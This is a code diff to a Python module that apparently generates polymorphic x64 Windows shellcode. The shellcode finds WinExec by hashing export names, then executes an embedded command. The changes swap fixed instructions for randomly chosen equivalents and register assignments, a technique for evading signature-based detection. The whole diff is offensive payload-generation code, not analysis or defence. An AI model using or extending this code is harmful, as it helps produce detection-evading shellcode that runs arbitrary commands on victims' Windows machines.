@@ -107,6 +107,7 @@ class module:
         fh = FunctionHash()
         
         # randomize instructions
+        # r9 variable is used as jump register
         rax, rbx, rcx, rdx, r8, r9, rsi, rdi, r10, r11 = vi.random.sample(vi.multi_bit_registers, 10)
         rc = vi.random.choice
 
@@ -240,25 +241,26 @@ class module:
                 ;{rc(vi.register_set_zero)} {rdx[0]}, {rdx[0]}
                 {vi.zero_register(rdx[0])}
                 mov {rdx[3]}, [{rdi[0]}]
-                test {rdx[3]}, {rdx[3]}
+                ;test {rdx[3]}, {rdx[3]}
+                {rc(vi.test_condition)} {rdx[3]}, {rdx[3]}
                 {rc(vi.jump_conditional_positive)} {lb_HashCompare}
                 {hash_algorithm} {r8[1]}, {shift_bits}       
                 add {r8[1]}, {rdx[1]}
                 {vi.increase_register(rdi[0])}
-                ;jmp {lb_HashLoop}
-                {vi.jump_instruction(lb_HashLoop)}
+                jmp {lb_HashLoop}
+                ;{vi.jump_instruction(lb_HashLoop)}
 
             {lb_HashCompare}:
                 cmp {r8[1]}, {hex(winexec_hash)}   
                 {rc(vi.jump_conditional_positive)} {lb_WinExecFound}
                 
-                add {rsi[0]}, 4                ; 
-                {vi.increase_register(rsi[0], 4)}
+                add {rsi[0]}, 4                
+                ;{vi.increase_register(rsi[0], 4)}
                 {vi.decrease_register(rcx[0])}
                 cmp {rcx[0]}, 0
                 {rc(vi.jump_conditional_negative)} {lb_findFuncPos}
-                ;jmp {lb_exit}
-                {vi.jump_instruction(lb_exit)}
+                jmp {lb_exit}
+                ;{vi.jump_instruction(lb_exit)}
 
             {lb_WinExecFound}:
                 ; load ordinal_table
@@ -275,8 +277,10 @@ class module:
                 mov rax, {rax[0]}
 
             {lb_InvokeWinExec}:
-                xor rdx, rdx
-                xor rcx, rcx  
+                ;xor rdx, rdx
+                ;xor rcx, rcx
+                {vi.zero_register('rdx')}
+                {vi.zero_register('rcx')}  
                 push rcx 
                 ; begin stacked_command
                 {stacked_command}
